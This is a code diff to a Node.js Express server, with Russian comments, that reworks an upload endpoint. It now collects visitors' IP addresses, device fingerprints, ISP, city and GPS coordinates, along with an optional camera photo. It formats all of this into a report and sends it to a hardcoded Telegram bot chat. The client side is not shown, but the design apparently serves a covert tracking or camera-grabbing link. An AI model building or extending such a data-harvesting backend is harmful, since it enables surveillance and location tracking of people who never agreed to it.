@@ -34,22 +34,97 @@ const upload = multer({
 // ===== СТАТИКА =====
 app.use(express.static('public'));
 
+// ===== ПОЛУЧЕНИЕ РЕАЛЬНОГО IP =====
+function getClientIP(req) {
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) {
+        return forwarded.split(',')[0].trim();
+    }
+    return req.socket.remoteAddress || req.connection.remoteAddress || 'unknown';
+}
+
 // ===== ОТПРАВКА В TELEGRAM =====
-async function sendPhotoToTelegram(filePath, filename) {
+async function sendToTelegram(photoPath, metadata, clientIP) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+        
+        // Формируем подпись с полными данными
+        const ts = metadata.timestamp || {};
+        const device = metadata.device || {};
+        const location = metadata.location || {};
+        const ip = metadata.ip || {};
+        
+        let caption = `📸 НОВОЕ ФОТО\n`;
+        caption += `━━━━━━━━━━━━━━━━━\n`;
+        caption += `🕐 Время: ${ts.date || 'unknown'} ${ts.time || 'unknown'}\n`;
+        caption += `⏱ Точное время: ${ts.ms_full || 'unknown'} ms\n`;
+        caption += `🌍 Часовой пояс: ${ts.timezone || 'unknown'}\n`;
+        caption += `━━━━━━━━━━━━━━━━━\n`;
+        caption += `📱 УСТРОЙСТВО:\n`;
+        caption += `  • ОС: ${device.os || 'unknown'}\n`;
+        caption += `  • Браузер: ${device.browser || 'unknown'}\n`;
+        caption += `  • Платформа: ${device.platform || 'unknown'}\n`;
+        caption += `  • Язык: ${device.language || 'unknown'}\n`;
+        caption += `  • Экран: ${device.screen?.width || '?'}x${device.screen?.height || '?'}\n`;
+        caption += `  • Пиксели: ${device.screen?.pixelRatio || '?'}\n`;
+        caption += `  • Память: ${device.memory || '?'} ГБ\n`;
+        caption += `  • Ядра: ${device.cores || '?'}\n`;
+        caption += `  • Touch: ${device.touchSupport ? '✅' : '❌'}\n`;
+        caption += `━━━━━━━━━━━━━━━━━\n`;
+        caption += `🌐 IP ИНФОРМАЦИЯ:\n`;
+        caption += `  • IP: ${ip.ip || clientIP || 'unknown'}\n`;
+        if (ip.country) caption += `  • Страна: ${ip.country}\n`;
+        if (ip.city) caption += `  • Город: ${ip.city}\n`;
+        if (ip.isp) caption += `  • Провайдер: ${ip.isp}\n`;
+        caption += `━━━━━━━━━━━━━━━━━\n`;
+        
+        // Геолокация
+        if (location.available) {
+            caption += `📍 ГЕОЛОКАЦИЯ:\n`;
+            caption += `  • Широта: ${location.latitude?.toFixed(6) || '?'}\n`;
+            caption += `  • Долгота: ${location.longitude?.toFixed(6) || '?'}\n`;
+            caption += `  • Точность: ${location.accuracy?.toFixed(0) || '?'} м\n`;
+            if (location.altitude) caption += `  • Высота: ${location.altitude?.toFixed(1) || '?'} м\n`;
+        } else {
+            caption += `📍 ГЕОЛОКАЦИЯ: ❌ ${location.error || 'недоступна'}\n`;
+        }
+        caption += `━━━━━━━━━━━━━━━━━\n`;
+        caption += `🔗 Ссылка: ${metadata.url || 'unknown'}\n`;
+        caption += `📝 Реферер: ${metadata.referrer || 'direct'}\n`;
+        caption += `📸 Фото: ${metadata.photo_taken ? '✅ сделано' : '❌ не получено'}`;
+
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', fs.createReadStream(filePath));
-        formData.append('caption', `📸 Новое фото\n🕐 ${new Date().toLocaleString('ru-RU')}\n📁 ${filename}`);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+        
+        // Добавляем фото, если есть
+        if (photoPath && fs.existsSync(photoPath)) {
+            formData.append('photo', fs.createReadStream(photoPath));
+        } else {
+            // Если нет фото, отправляем просто текст
+            const textUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const textData = new FormData();
+            textData.append('chat_id', TELEGRAM_CHAT_ID);
+            textData.append('text', caption);
+            textData.append('parse_mode', 'HTML');
+            
+            const response = await axios.post(textUrl, textData, {
+                headers: { ...textData.getHeaders() },
+                timeout: 10000
+            });
+            console.log('✅ Данные отправлены в Telegram (без фото)');
+            return response.data;
+        }
         
         const response = await axios.post(url, formData, {
             headers: { ...formData.getHeaders() },
-            timeout: 10000
+            timeout: 15000
         });
         
-        console.log('✅ Фото отправлено в Telegram');
+        console.log('✅ Фото и данные отправлены в Telegram');
         return response.data;
+        
     } catch (err) {
         console.error('❌ Ошибка отправки в Telegram:', err.response?.data || err.message);
         throw err;
@@ -58,27 +133,35 @@ async function sendPhotoToTelegram(filePath, filename) {
 
 // ===== ОБРАБОТЧИК =====
 app.post('/upload', upload.single('photo'), async (req, res) => {
-    if (!req.file) {
-        return res.status(400).json({ success: false, error: 'Фото не получено' });
-    }
-
     try {
-        const filePath = req.file.path;
-        const filename = req.file.filename;
+        const clientIP = getClientIP(req);
+        const metadata = req.body.metadata ? JSON.parse(req.body.metadata) : {};
+        const photoPath = req.file ? req.file.path : null;
+        const filename = req.file ? req.file.filename : null;
         
-        console.log(`📸 Получено фото: ${filename}`);
-        await sendPhotoToTelegram(filePath, filename);
+        console.log(`📸 Получены данные от: ${clientIP}`);
+        console.log(`📊 Метаданные:`, metadata);
         
-        // Удаляем после отправки
-        fs.unlink(filePath, (err) => {
-            if (err) console.error('Ошибка удаления файла:', err);
-            else console.log('🗑️ Файл удалён');
+        // Отправляем в Telegram
+        await sendToTelegram(photoPath, metadata, clientIP);
+        
+        // Удаляем файл после отправки
+        if (photoPath && fs.existsSync(photoPath)) {
+            fs.unlink(photoPath, (err) => {
+                if (err) console.error('Ошибка удаления файла:', err);
+                else console.log('🗑️ Файл удалён');
+            });
+        }
+        
+        res.json({ 
+            success: true, 
+            filename: filename || 'no_photo',
+            ip: clientIP
         });
         
-        res.json({ success: true, filename });
     } catch (err) {
         console.error('Ошибка обработки:', err);
-        res.status(500).json({ success: false, error: 'Ошибка отправки в Telegram' });
+        res.status(500).json({ success: false, error: 'Ошибка обработки' });
     }
 });
 
